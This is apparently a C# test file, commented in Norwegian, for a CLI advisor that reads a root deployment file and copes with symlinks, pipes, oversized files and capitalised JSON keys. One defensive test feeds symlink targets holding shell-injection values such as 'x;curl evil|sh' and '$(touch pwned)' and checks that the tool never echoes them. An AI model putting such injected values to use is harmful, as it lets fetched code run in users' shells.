using System.Diagnostics;
using System.Text;
using System.Text.Json.Nodes;
using Queuey.Client.Cli.Advise;
using Queuey.Client.Waas;

namespace Queuey.Client.Cli.Tests;

/// <summary>
/// queuey.deploy.json i roten etter re-reviewen av #56 (B-1, 2026-10-06): en fil som var der, men som skanningen ikke leste
/// (en lenke, for stor, budsjett eller frist), ble regnet som borte, og agenten fikk beskjed om å skrive en ny fil over den.
/// Nå sjekkes den for seg og leses før og utenfor budsjettet. En form advise ikke leser, gir en konflikt med veien ut, aldri
/// et forslag om en ny fil. Og flettingen leser egenskapsnavn i alle skrivemåter, som leseren av fila gjør (K-3).
/// Etter reviewen av #57: et lenkemål vises bare når det er en vanlig sti (K-b), og det som åpnes, kan ikke være et rør som
/// holder skanningen (K-a).
/// </summary>
public sealed class RootDeployFileTests : IDisposable
{
    private readonly string _root = Path.Combine(Path.GetTempPath(), "queuey-rootfile-" + Guid.NewGuid().ToString("N")[..8]);
    private readonly List<string> _outside = new();
    private readonly List<string> _pipes = new();

    private const string StripeIntent = """
        {
          "source": { "kind": { "value": "stripe", "provenance": "stated" } },
          "destination": { "route": { "value": "/api/stripe", "provenance": "stated" } }
        }
        """;

    private const string TwoQueues = """{ "queues": { "orders": { "delivery": { "url": "https://orders.example.com/hook" } }, "refunds": {} } }""";

    public RootDeployFileTests() => Directory.CreateDirectory(_root);

    public void Dispose()
    {
        foreach (string pipe in _pipes)
            Release(pipe);
        foreach (string dir in _outside.Append(_root))
        {
            try { Directory.Delete(dir, recursive: true); } catch (IOException) { } catch (UnauthorizedAccessException) { }
        }
    }

    // ── formene advise ikke leser ────────────────────────────────────────

    [Fact]
    public void A_link_to_the_deployment_file_in_a_monorepo_is_a_conflict_that_names_where_it_points()
    {
        Fixture("stripe-aspnet");
        File_("infra/queuey.deploy.json", TwoQueues);
        if (!TryLink("queuey.deploy.json", "infra/queuey.deploy.json"))
            return;

        FlowAdvice advice = Advise();

        FlowConflict conflict = Assert.Single(advice.Flow.Conflicts);
        Assert.Equal(("unsupported", "queuey.deploy.json"), (conflict.Kind, conflict.Field));
        Assert.Contains("is a symbolic link to infra/queuey.deploy.json", conflict.Message, StringComparison.Ordinal);
        Assert.Contains("write the content it proposes to infra/queuey.deploy.json", conflict.Question, StringComparison.Ordinal);
        // git checkout gir bare lenken tilbake når git har den (K-b).
        Assert.Contains("git checkout -- queuey.deploy.json when git tracks it, or ln -sf infra/queuey.deploy.json queuey.deploy.json " +
                        "when it does not", conflict.Question, StringComparison.Ordinal);
        Assert.Null(advice.Design);   // aldri en ny fil over lenken
    }

    [Theory]
    [InlineData("infra/x;curl evil|sh.json", "curl")]
    [InlineData("infra/$(touch pwned).json", "pwned")]
    [InlineData("-rf.json", "-rf")]
    public void A_link_whose_target_is_not_a_plain_path_does_not_show_where_it_points(string target, string part)
    {
        // Veien ut er kommandoer en agent kan lime inn i et skall: et mål med ; | $( eller - først vises aldri (K-b).
        Fixture("stripe-aspnet");
        if (!TryLink("queuey.deploy.json", target))
            return;

        FlowAdvice advice = Advise();

        FlowConflict conflict = Assert.Single(advice.Flow.Conflicts);
        Assert.Contains("is a symbolic link out of the repository", conflict.Message, StringComparison.Ordinal);
        string shown = conflict.Message + "\n" + conflict.Question;
        foreach (string unsafePart in new[] { part, ";", "|", "$(" })
            Assert.DoesNotContain(unsafePart, shown, StringComparison.Ordinal);
        Assert.Null(advice.Design);
    }

    [Fact]
    public void A_link_out_of_the_repository_is_a_conflict_that_does_not_show_where_it_points()
    {
        Fixture("stripe-aspnet");
        string outside = Path.Combine(Path.GetTempPath(), "queuey-rootfile-outside-" + Guid.NewGuid().ToString("N")[..8]);
        _outside.Add(outside);
        Directory.CreateDirectory(outside);
        File.WriteAllText(Path.Combine(outside, "queuey.deploy.json"), TwoQueues);
        if (!TryLink("queuey.deploy.json", Path.Combine(outside, "queuey.deploy.json")))
            return;

        FlowConflict conflict = Assert.Single(Advise().Flow.Conflicts);

        Assert.Contains("is a symbolic link out of the repository", conflict.Message, StringComparison.Ordinal);
        Assert.DoesNotContain(outside, conflict.Message + conflict.Question, StringComparison.Ordinal);
    }

    [Fact]
    public void A_link_to_nothing_is_still_a_link_and_a_conflict()
    {
        Fixture("stripe-aspnet");
        if (!TryLink("queuey.deploy.json", "infra/missing.json"))
            return;

        FlowAdvice advice = Advise();

        Assert.Equal("queuey.deploy.json", Assert.Single(advice.Flow.Conflicts).Field);
        Assert.Null(advice.Design);
    }

    [Fact]
    public void A_folder_where_the_deployment_file_should_be_is_a_conflict()
    {
        Fixture("stripe-aspnet");
        Directory.CreateDirectory(Path.Combine(_root, "queuey.deploy.json"));

        FlowConflict conflict = Assert.Single(Advise().Flow.Conflicts);

        Assert.Contains("is a folder, not a file", conflict.Message, StringComparison.Ordinal);
    }

    [Fact]
    public void A_deployment_file_larger_than_advise_reads_is_a_conflict_not_a_new_file()
    {
        Fixture("stripe-aspnet");
        File_("queuey.deploy.json", "{ \"queues\": { \"orders\": {} }, \"$schema\": \"" + new string('x', 600 * 1024) + "\" }");

        FlowAdvice advice = Advise();

        FlowConflict conflict = Assert.Single(advice.Flow.Conflicts);
        Assert.Contains("is larger than 512 KiB", conflict.Message, StringComparison.Ordinal);
        Assert.Null(advice.Design);
    }

    [Fact]
    public void A_deployment_file_this_user_cannot_read_is_a_conflict()
    {
        if (OperatingSystem.IsWindows() || Environment.UserName == "root")
            return;   // root leser filen uansett, og Windows har ikke Unix-moduser

        Fixture("stripe-aspnet");
        File_("queuey.deploy.json", TwoQueues);
        File.SetUnixFileMode(Path.Combine(_root, "queuey.deploy.json"), UnixFileMode.None);
        try
        {
            FlowConflict conflict = Assert.Single(Advise().Flow.Conflicts);

            Assert.Contains("could not be read", conflict.Message, StringComparison.Ordinal);
        }
        finally
        {
            File.SetUnixFileMode(Path.Combine(_root, "queuey.deploy.json"), UnixFileMode.UserRead | UnixFileMode.UserWrite);
        }
    }

    // ── det som åpnes, er ikke det som ble sjekket (K-a) ────────────────
    //
    // Et bytte mellom sjekken og åpningen, eller mellom lesingen og den nye sjekken av lenken, lar seg ikke treffe på
    // et bestemt tidspunkt i en test. Rørene under står der fra start og prøver det åpningen gjør når byttet har skjedd.

    [Fact]
    public async Task A_pipe_where_the_deployment_file_should_be_is_a_conflict_once_the_open_times_out()
    {
        Fixture("stripe-aspnet");
        if (!TryPipe("queuey.deploy.json"))
            return;

        // Testens egen frist: henger åpningen, feiler testen i stedet for å vente for alltid.
        FlowFacts facts = await Task.Run(() => FlowScan.Scan(_root, ScanBudget.Default, TimeSpan.FromMilliseconds(300)))
            .WaitAsync(TimeSpan.FromSeconds(60));
        FlowAdvice advice = FlowAdvisor.Advise(DesiredFlow.Parse(StripeIntent), facts, _root);

        FlowConflict conflict = Assert.Single(advice.Flow.Conflicts);
        Assert.Equal(("unsupported", "queuey.deploy.json"), (conflict.Kind, conflict.Field));
        Assert.Contains("did not open within 300 ms, as a pipe without a writer never does", conflict.Message, StringComparison.Ordinal);
        Assert.Null(advice.Design);
    }

    [Fact]
    public async Task A_pipe_with_a_writer_is_refused_before_anything_is_read_from_it()
    {
        Fixture("stripe-aspnet");
        if (!TryPipe("queuey.deploy.json"))
            return;
        string pipe = Path.Combine(_root, "queuey.deploy.json");

        // Skriveren kommer fram når leseren åpner, og skriver en fil som ville gitt to køer om den ble lest.
        Task writer = Task.Factory.StartNew(() =>
        {
            try
            {
                using var stream = new FileStream(pipe, FileMode.Open, FileAccess.Write, FileShare.ReadWrite);
                stream.Write(Encoding.UTF8.GetBytes(TwoQueues));
            }
            catch (IOException)
            {
                // leseren lukket røret uten å lese
            }
        }, TaskCreationOptions.LongRunning);

        FlowFacts facts = await Task.Run(() => FlowScan.Scan(_root, ScanBudget.Default, TimeSpan.FromSeconds(30)))
            .WaitAsync(TimeSpan.FromSeconds(60));
        FlowAdvice advice = FlowAdvisor.Advise(DesiredFlow.Parse(StripeIntent), facts, _root);

        FlowConflict conflict = Assert.Single(advice.Flow.Conflicts);
        Assert.Contains("is not a regular file (a pipe or a socket, for instance)", conflict.Message, StringComparison.Ordinal);
        Assert.Empty(facts.DeployFile!.Queues);
        Assert.Null(advice.Design);
        await writer.WaitAsync(TimeSpan.FromSeconds(30));
    }

    // ── budsjettet og fristen rører den ikke ─────────────────────────────

    public static TheoryData<string> Budgets => new() { "deadline", "bytes", "files", "large" };

    [Theory]
    [MemberData(nameof(Budgets))]
    public void The_deployment_file_is_read_whatever_the_scan_has_left_of_its_budget(string budget)
    {
        // Før kunne fristen på 15 s gå ut før fila ble lest, og forslaget ble en ny fil uten orders og refunds.
        Fixture("stripe-aspnet");
        File_("queuey.deploy.json", TwoQueues);
        ScanBudget spent = budget switch
        {
            "deadline" => ScanBudget.Default with { Deadline = TimeSpan.Zero },
            "bytes" => ScanBudget.Default with { MaxTotalBytes = 10 },
            "files" => ScanBudget.Default with { MaxFiles = 0 },
            _ => ScanBudget.Default with { MaxFileBytes = 10 },
        };

        FlowFacts facts = FlowScan.Scan(_root, spent);
        FlowAdvice advice = FlowAdvisor.Advise(DesiredFlow.Parse(StripeIntent), facts, _root);

        Assert.Equal(new[] { "orders", "refunds" }, facts.DeployFile!.Queues.Keys.OrderBy(k => k).ToArray());
        FlowDesign design = advice.Design!;
        Assert.True(design.Exists);
        Assert.Equal(new[] { "orders", "refunds", "stripe" }, design.Content["queues"]!.AsObject().Select(q => q.Key).ToArray());
    }

    [Fact]
    public void An_empty_deployment_file_is_one_that_is_there_and_says_nothing()
    {
        Fixture("stripe-aspnet");
        File_("queuey.deploy.json", "");

        FlowDesign design = Advise().Design!;

        Assert.True(design.Exists);
        Assert.Equal(new[] { "stripe" }, design.Content["queues"]!.AsObject().Select(q => q.Key).ToArray());
        DeploymentFile.Parse(design.Content.ToJsonString()).Resolve();
    }

    [Fact]
    public void A_deployment_file_below_the_root_is_not_the_one_apply_reads()
    {
        // Bare roten teller: infra/queuey.deploy.json uten lenke er ingen fil advise fletter inn i.
        Fixture("stripe-aspnet");
        File_("infra/queuey.deploy.json", TwoQueues);

        FlowDesign design = Advise().Design!;

        Assert.False(design.Exists);
    }

    // ── skrivemåten på egenskapene (K-3) ────────────────────────────────

    [Fact]
    public void A_file_that_spells_its_properties_with_capitals_is_merged_into_them_not_beside_them()
    {
        Fixture("stripe-aspnet");
        File_("queuey.deploy.json", """
            {
              "Workspace": { "Delivery": { "BaseUrl": "https://api.example.com" } },
              "Queues": { "orders": { "Delivery": { "Url": "/orders" } } },
              "Profiles": { "prod": { "Variables": { "QUEUEY_WORKSPACE_ENVIRONMENT": "prod" } } }
            }
            """);

        FlowDesign design = Advise().Design!;
        JsonObject content = design.Content;

        Assert.Equal(new[] { "Workspace", "Queues", "Profiles" }, content.Select(p => p.Key).ToArray());
        Assert.Equal(new[] { "orders", "stripe" }, content["Queues"]!.AsObject().Select(q => q.Key).ToArray());
        Assert.Equal("/api/stripe", content["Queues"]!["stripe"]!["delivery"]!["url"]!.GetValue<string>());   // relativ: fila har en base
        // Uten miljø er fila for prod (oppfølging av #58): verdiene går inn i profilen prod, under Variables slik fila skriver det.
        Assert.False(content["Profiles"]!.AsObject().ContainsKey("dev"));
        JsonObject prod = content["Profiles"]!["prod"]!.AsObject();
        Assert.False(prod.ContainsKey("variables"));
        Assert.Equal("http", prod["Variables"]!["QUEUEY_STRIPE_DELIVERY_KIND"]!.GetValue<string>());
        DeploymentFile.Parse(content.ToJsonString()).Resolve();
    }

    [Fact]
    public void A_queue_whose_delivery_is_spelled_with_capitals_keeps_one_delivery()
    {
        Fixture("stripe-aspnet");
        File_("queuey.deploy.json", """
            {
              "Workspace": { "Delivery": { "BaseUrl": "https://api.example.com" } },
              "Queues": { "stripe": { "Delivery": { "Url": "/api/stripe", "Kind": "http" } } }
            }
            """);

        FlowDesign design = Advise().Design!;
        JsonObject queue = design.Content["Queues"]!["stripe"]!.AsObject();

        Assert.False(queue.ContainsKey("delivery"));
        JsonObject delivery = queue["Delivery"]!.AsObject();
        Assert.Equal("/api/stripe", delivery["Url"]!.GetValue<string>());
        Assert.Equal("http", delivery["Kind"]!.GetValue<string>());   // fila vinner over typen intensjonen ikke oppgir
        Assert.False(delivery.ContainsKey("url") || delivery.ContainsKey("kind"));
        Assert.True(delivery.ContainsKey("signing"));                // det fila ikke hadde, legges til der
        DeploymentFile.Parse(design.Content.ToJsonString()).Resolve();
    }

    // ── gangen gjennom mappene (K-1, K-2) ───────────────────────────────

    [Fact]
    public void A_folder_with_more_entries_than_the_budget_is_read_in_part_and_says_so()
    {
        Fixture("stripe-aspnet");   // roten har fire oppføringer

        FlowFacts facts = FlowScan.Scan(_root, ScanBudget.Default with { MaxEntriesPerDirectory = 2 });

        Assert.Contains(facts.Limits, l => l.StartsWith("1 folder with more than 2 entries read in part", StringComparison.Ordinal));
    }

    [Fact]
    public void A_link_is_known_by_its_target_and_a_plain_file_is_not_a_link()
    {
        File_("plain.json", "{}");
        Assert.False(RepoWalk.IsLink(new FileInfo(Path.Combine(_root, "plain.json"))));

        if (!TryLink("linked.json", "plain.json"))
            return;
        Assert.True(RepoWalk.IsLink(new FileInfo(Path.Combine(_root, "linked.json"))));
    }

    // ── hjelpere ─────────────────────────────────────────────────────────

    private FlowAdvice Advise() => FlowAdvisor.Advise(DesiredFlow.Parse(StripeIntent), FlowScan.Scan(_root), _root);

    private bool TryLink(string relativePath, string target)
    {
        try
        {
            File.CreateSymbolicLink(Path.Combine(_root, relativePath), target);
            return true;
        }
        catch (Exception ex) when (ex is IOException or UnauthorizedAccessException)
        {
            return false;   // Windows uten utviklermodus lager ikke lenker
        }
    }

    /// <summary>Et navngitt rør (mkfifo) der en fil skulle stå; false der det ikke lar seg lage (Windows).</summary>
    private bool TryPipe(string relativePath)
    {
        if (OperatingSystem.IsWindows())
            return false;

        string path = Path.Combine(_root, relativePath);
        var start = new ProcessStartInfo("mkfifo") { UseShellExecute = false };
        start.ArgumentList.Add(path);
        try
        {
            using Process mkfifo = Process.Start(start)!;
            if (!mkfifo.WaitForExit(10_000) || mkfifo.ExitCode != 0)
                return false;
        }
        catch (System.ComponentModel.Win32Exception)
        {
            return false;   // ingen mkfifo på stien
        }

        _pipes.Add(path);
        return true;
    }

    /// <summary>
    /// Slipper en åpning som fortsatt venter på en skriver i røret. Å åpne det for lesing og skriving venter aldri selv
    /// (Linux og macOS), men tråden får likevel en frist.
    /// </summary>
    private static void Release(string pipe)
    {
        var release = new Thread(() =>
        {
            try
            {
                new FileStream(pipe, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite).Dispose();
            }
            catch (Exception ex) when (ex is IOException or UnauthorizedAccessException)
            {
                // borte eller ikke lenger et rør
            }
        }) { IsBackground = true };
        release.Start();
        release.Join(TimeSpan.FromSeconds(2));
    }

    private void Fixture(string name)
    {
        string from = Path.Combine(RepoRoot(), "tests", "Queuey.Client.Cli.Tests", "Fixtures", "flows", name);
        foreach (string file in Directory.GetFiles(from, "*", SearchOption.AllDirectories))
        {
            string to = Path.Combine(_root, Path.GetRelativePath(from, file));
            Directory.CreateDirectory(Path.GetDirectoryName(to)!);
            File.Copy(file, to, overwrite: true);
        }
    }

    private void File_(string relativePath, string content)
    {
        string full = Path.Combine(_root, relativePath.Replace('/', Path.DirectorySeparatorChar));
        Directory.CreateDirectory(Path.GetDirectoryName(full)!);
        File.WriteAllText(full, content);
    }

    private static string RepoRoot()
    {
        string? dir = AppContext.BaseDirectory;
        while (dir is not null && !File.Exists(Path.Combine(dir, "Queuey.Client.sln")))
            dir = Path.GetDirectoryName(dir);
        return dir ?? throw new InvalidOperationException("Could not find the repository root (Queuey.Client.sln).");
    }
}
